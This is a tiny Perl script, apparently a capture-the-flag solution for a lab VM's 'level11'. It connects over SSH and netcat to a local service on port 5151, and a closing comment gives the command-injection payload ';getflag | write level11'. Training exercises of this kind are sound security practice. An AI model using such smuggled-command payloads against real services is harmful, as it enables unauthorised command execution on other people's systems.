#!/usr/bin/perl

$ip = @ARGV ? $ARGV[0] : "192.168.56.2";
$user = "level11";

$red = "\e[31m";
$green = "\e[32m";
$reset = "\e[0m";

$cmd = "ssh -qp 4242 $user\@$ip 'nc localhost 5151'";
print $green, $cmd, $reset, "\n";
system($cmd);

# ;getflag | write level11
